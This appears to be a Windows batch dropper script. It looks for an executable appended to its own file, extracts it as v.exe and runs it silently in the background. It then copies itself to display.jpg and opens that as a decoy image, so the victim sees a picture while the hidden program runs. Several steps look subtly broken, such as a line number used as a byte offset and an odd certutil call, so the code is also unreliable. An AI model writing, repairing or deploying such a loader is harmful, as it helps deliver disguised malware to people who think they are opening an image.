@echo off
setlocal enabledelayedexpansion

:: === DEBUG MODE ===
echo Script started...
echo Searching for EXE...
timeout /t 2 >nul

:: Find "MZ" (EXE header) using CERTUTIL (more reliable)
certutil -encode "%~f0" temp.b64 >nul
findstr /b /c:"MZ" "%~f0" >nul && (
    for /f "tokens=1 delims=:" %%i in ('findstr /n /b /c:"MZ" "%~f0"') do (
        set /a exeStart=%%i - 1
        goto :extract
    )
)

:extract
if not defined exeStart (
    echo ERROR: EXE header "MZ" not found.
    pause
    exit /b 1
)

echo EXE starts at byte: %exeStart%
timeout /t 2 >nul

:: Extract EXE using FSUTIL (binary-safe)
fsutil file createnew "%~dp0\v.exe" 0 >nul
certutil -f -decodehex "%~f0" "%~dp0\v.exe" %exeStart% >nul

if not exist "%~dp0\v.exe" (
    echo ERROR: Extraction failed.
    pause
    exit /b 1
)

echo Running extracted.exe...
start "" /B "%~dp0\v.exe"

echo Extracting image...
copy /b "%~f0" "%~dp0\display.jpg" /y
start "" "%~dp0\display.jpg"

echo Done! Closing in 3 sec...
timeout /t 3 >nul
exit /b

MZ